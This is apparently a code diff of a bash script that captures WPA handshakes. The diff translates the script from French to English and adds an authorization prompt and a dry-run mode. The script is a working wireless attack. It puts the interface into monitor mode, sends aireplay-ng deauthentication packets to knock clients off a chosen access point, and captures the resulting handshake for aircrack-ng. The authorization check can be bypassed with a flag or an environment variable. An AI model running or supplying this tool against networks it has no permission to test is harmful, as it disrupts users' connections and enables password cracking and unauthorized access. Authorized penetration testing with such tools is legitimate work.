@@ -1,22 +1,7 @@
 #!/bin/bash
-# wifi_pentest.sh - Scan & capture WPA handshake
+# scan_wifi.sh - WPA handshake capture helper for authorized Wi-Fi tests.
 set -euo pipefail
 
-# Vérifie les droits root
-if [[ $EUID -ne 0 ]]; then
-    echo "❌ Ce script doit être exécuté en tant que root" >&2
-    exit 1
-fi
-
-# Vérification des outils requis
-for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
-    if ! command -v "$cmd" &>/dev/null; then
-        echo "❌ Outil manquant : $cmd" >&2
-        exit 1
-    fi
-done
-
-# Valeurs par défaut
 INTERFACE="wlan0"
 OUTPUT_DIR="wifi_captures"
 CHANNEL=6
@@ -25,25 +10,46 @@ DEAUTH_COUNT=5
 BSSID=""
 ESSID=""
 NON_INTERACTIVE=false
+DRY_RUN=false
+ASSUME_AUTHORIZED="${SCRIPTING_ASSUME_AUTHORIZED:-false}"
 
 usage() {
     cat <<EOF >&2
 Usage: $0 [options]
-  -i interface        : interface WiFi à utiliser (par défaut: $INTERFACE)
-  -c channel          : canal WiFi (par défaut: $CHANNEL)
-  -o dir              : dossier de sortie pour la capture (par défaut: $OUTPUT_DIR)
-  -t seconds          : durée de capture (par défaut: $CAPTURE_TIME)
-  -d count            : nombre de paquets de désauth (par défaut: $DEAUTH_COUNT)
-  -b bssid            : BSSID cible (sinon demandé)
-  -e essid            : ESSID du réseau (sinon demandé)
-  --bssid <bssid>     : BSSID cible
-  --essid <essid>     : ESSID du réseau
-  --non-interactive   : n'interagit pas; nécessite --bssid et --essid
+  -i interface             Wi-Fi interface (default: $INTERFACE)
+  -c channel               Wi-Fi channel (default: $CHANNEL)
+  -o dir                   Output directory (default: $OUTPUT_DIR)
+  -t seconds               Capture duration (default: $CAPTURE_TIME)
+  -d count                 Deauth packet count (default: $DEAUTH_COUNT)
+  -b bssid                 Target BSSID
+  -e essid                 Target ESSID
+  --bssid <bssid>          Target BSSID
+  --essid <essid>          Target ESSID
+  --non-interactive        Require --bssid and --essid
+  --dry-run                Print planned actions without capturing
+  --yes-i-am-authorized    Confirm explicit authorization
+  --help                   Show this help
 EOF
     exit 1
 }
 
-# Analyse des options
+require_authorization() {
+    if [[ "$ASSUME_AUTHORIZED" == true ]]; then
+        return 0
+    fi
+
+    if [[ ! -t 0 ]]; then
+        echo "Authorization confirmation required. Re-run with --yes-i-am-authorized only for approved Wi-Fi tests." >&2
+        exit 1
+    fi
+
+    read -rp "Type AUTHORIZED to confirm this Wi-Fi test is approved: " confirmation
+    if [[ "$confirmation" != "AUTHORIZED" ]]; then
+        echo "Aborted." >&2
+        exit 1
+    fi
+}
+
 while getopts "i:c:o:t:d:b:e:-:h" opt; do
     case $opt in
         i) INTERFACE="$OPTARG" ;;
@@ -66,6 +72,15 @@ while getopts "i:c:o:t:d:b:e:-:h" opt; do
                 non-interactive)
                     NON_INTERACTIVE=true
                     ;;
+                dry-run)
+                    DRY_RUN=true
+                    ;;
+                yes-i-am-authorized)
+                    ASSUME_AUTHORIZED=true
+                    ;;
+                help)
+                    usage
+                    ;;
                 *)
                     usage
                     ;;
@@ -76,23 +91,40 @@ while getopts "i:c:o:t:d:b:e:-:h" opt; do
 done
 shift $((OPTIND - 1))
 
-if [[ "$NON_INTERACTIVE" == true ]]; then
-    if [[ -z "$BSSID" || -z "$ESSID" ]]; then
-        echo "❌ --bssid et --essid sont requis en mode non interactif" >&2
-        exit 1
-    fi
+require_authorization
+
+if [[ "$NON_INTERACTIVE" == true && ( -z "$BSSID" || -z "$ESSID" ) ]]; then
+    echo "--bssid and --essid are required in non-interactive mode." >&2
+    exit 1
 fi
 
 MONITOR_IF="${INTERFACE}mon"
+
+if [[ "$DRY_RUN" == true ]]; then
+    echo "DRY RUN: interface=$INTERFACE monitor=$MONITOR_IF channel=$CHANNEL output=$OUTPUT_DIR"
+    echo "DRY RUN: BSSID=${BSSID:-interactive} ESSID=${ESSID:-interactive} deauth_count=$DEAUTH_COUNT capture_time=$CAPTURE_TIME"
+    exit 0
+fi
 
 mkdir -p "$OUTPUT_DIR"
 LOG_FILE="$OUTPUT_DIR/scan_wifi.log"
 exec > >(tee -a "$LOG_FILE") 2>&1
 
-echo "[*] Activation du mode monitor sur $INTERFACE..."
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root." >&2
+    exit 1
+fi
+
+for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
+    if ! command -v "$cmd" >/dev/null 2>&1; then
+        echo "Missing required tool: $cmd" >&2
+        exit 1
+    fi
+done
+
+echo "[*] Enabling monitor mode on $INTERFACE..."
 airmon-ng start "$INTERFACE" >/dev/null
 
-# Nettoyage en cas d'interruption
 cleanup() {
     if [[ -n "${AIRDUMP_PID:-}" ]]; then
         kill "$AIRDUMP_PID" 2>/dev/null || true
@@ -101,42 +133,40 @@ cleanup() {
 }
 trap cleanup EXIT
 
-echo "[*] Lancement du scan des réseaux disponibles..."
+echo "[*] Scanning available networks..."
 timeout 20s airodump-ng "$MONITOR_IF"
 
 if [[ -z "$BSSID" ]]; then
-    read -rp "Entrez le BSSID cible : " BSSID
+    read -rp "Target BSSID: " BSSID
 fi
 if [[ -z "$ESSID" ]]; then
-    read -rp "Entrez le nom (SSID) du réseau : " ESSID
+    read -rp "Network ESSID: " ESSID
 fi
 
-echo "[*] Capture du handshake sur $ESSID ($BSSID)..."
+echo "[*] Capturing handshake for $ESSID ($BSSID)..."
 CAP_BASENAME="handshake_$(date +%Y%m%d_%H%M%S)"
 airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$OUTPUT_DIR/$CAP_BASENAME" "$MONITOR_IF" &
 AIRDUMP_PID=$!
 
 sleep 5
-echo "[*] Déauthentification d’un client pour forcer handshake..."
+echo "[*] Sending deauth packets to force a handshake..."
 aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MONITOR_IF"
 
-echo "[*] Attente du handshake pendant $CAPTURE_TIME s..."
+echo "[*] Waiting $CAPTURE_TIME seconds for handshake..."
 sleep "$CAPTURE_TIME"
 kill "$AIRDUMP_PID" 2>/dev/null || true
 
-# Vérifie la présence du fichier de capture
 HANDSHAKE_FILE="$OUTPUT_DIR/${CAP_BASENAME}-01.cap"
 if [[ -f "$HANDSHAKE_FILE" ]]; then
-    echo "✅ Handshake capturé : $HANDSHAKE_FILE"
-    echo "[*] Validation du handshake..."
+    echo "Handshake captured: $HANDSHAKE_FILE"
+    echo "[*] Validating handshake..."
     if aircrack-ng -w /dev/null "$HANDSHAKE_FILE" >/dev/null; then
-        echo "✅ Handshake valide"
+        echo "Handshake appears valid."
     else
-        echo "❌ Handshake invalide" >&2
+        echo "Handshake validation failed." >&2
     fi
 else
-    echo "❌ Handshake non trouvé" >&2
+    echo "Handshake file not found." >&2
 fi
 
-echo "📄 Journal enregistré dans $LOG_FILE"
-
+echo "Log saved to $LOG_FILE"
